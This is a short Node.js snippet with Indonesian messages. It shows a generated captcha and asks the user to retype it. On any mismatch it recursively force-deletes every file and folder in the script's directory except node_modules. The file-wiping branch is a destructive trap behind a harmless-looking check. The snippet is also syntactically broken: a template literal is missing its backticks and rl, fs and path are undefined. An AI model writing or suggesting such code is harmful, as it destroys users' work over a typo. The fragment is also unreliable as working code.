 function generateCaptcha() { 
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
   let captcha = ''; 
   for (let i = 0; i < 6; i++) { 
     captcha += chars[Math.floor(Math.random() * chars.length)]; 
   } return captcha;
 }

const captcha = generateCaptcha(); 
console.log(Captcha: ${captcha});

rl.question('Masukkan captcha: ', (input) => { 
  if (input.trim() !== captcha) {
    console.log('Captcha salah! Menghapus semua file kecuali node_modules...'); 
    const dir = path.resolve(__dirname);
    fs.readdirSync(dir).forEach(file => { 
      if (file !== 'node_modules') { 
        fs.rmSync(path.join(dir, file), { 
          recursive: true, force: true }); 
      } }); 
    console.log('File terhapus.'); 
    process.exit(1);
  } else {
    console.log('Captcha benar!'); 
  } rl.close();
})

  
